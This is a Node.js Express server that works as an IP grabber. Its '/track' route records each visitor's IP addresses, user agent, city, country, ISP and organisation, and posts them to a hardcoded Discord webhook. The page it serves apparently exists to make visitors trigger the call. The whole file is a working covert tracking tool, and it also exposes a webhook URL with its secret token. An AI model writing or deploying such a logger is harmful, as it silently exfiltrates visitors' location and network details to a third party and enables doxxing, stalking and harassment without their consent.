import express from "express";
import fetch from "node-fetch";

const app = express();
const PORT = process.env.PORT || 3000;

const WEBHOOK_URL = "https://discord.com/api/webhooks/1511274000641167400/K-dYT4j9-0dWuvQJ4yKMLR7PWiTEXQ7FpXQSxoFN8pEtER5yyVHpGxvPb0SLkEy4uqMO";

app.set("trust proxy", true);

// Home
app.get("/", (req, res) => {
    res.sendFile("index.html", { root: process.cwd() });
});

// TRACK
app.get("/track", async (req, res) => {

    // =========================
    // 1. RAW IP SOURCES
    // =========================
    const forwarded = req.headers["x-forwarded-for"] || "None";
    const socketIp = req.socket.remoteAddress || "None";

    // Clean first real IP from forwarded list
    let realIp = forwarded.split(",")[0].trim();
    realIp = realIp.replace("::ffff:", "");

    const userAgent = req.headers["user-agent"] || "Unknown";

    const isIPv6 = realIp.includes(":");
    const isIPv4 = realIp.includes(".");

    // =========================
    // 2. GEO LOOKUP
    // =========================
    let city = "Unknown";
    let country = "Unknown";
    let isp = "Unknown";
    let org = "Unknown";

    const isLocal =
        realIp === "::1" ||
        realIp === "127.0.0.1" ||
        realIp.startsWith("192.168.") ||
        realIp.startsWith("10.") ||
        realIp.startsWith("172.");

    if (!isLocal && realIp) {
        try {
            const geoRes = await fetch(`https://ipwho.is/${realIp}`);
            const data = await geoRes.json();

            if (data.success) {
                city = data.city || "Unknown";
                country = data.country || "Unknown";
                isp = data.connection?.isp || "Unknown";
                org = data.connection?.org || "Unknown";
            }
        } catch (err) {
            console.error("Geo lookup failed:", err);
        }
    } else {
        city = "Local Network";
        country = "Local";
    }

    // =========================
    // 3. DISCORD MESSAGE (3 IPs)
    // =========================
    const message = `
🇵🇭 New Visitor Logged

🌍 Real IP: ${realIp}
📦 Forwarded IPs: ${forwarded}
🧠 Socket IP: ${socketIp}

📶 Type: ${isIPv4 ? "IPv4" : isIPv6 ? "IPv6" : "Unknown"}

📍 Location: ${city}, ${country}
🏢 ISP: ${isp}
🏢 Org: ${org}

🖥️ Device: ${userAgent}
`;

    // =========================
    // 4. SEND TO DISCORD
    // =========================
    try {
        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: message })
        });
    } catch (err) {
        console.error("Webhook failed:", err);
    }

    res.sendStatus(200);
});

// START
app.listen(PORT, () => {
    console.log("Server running on port " + PORT);
});
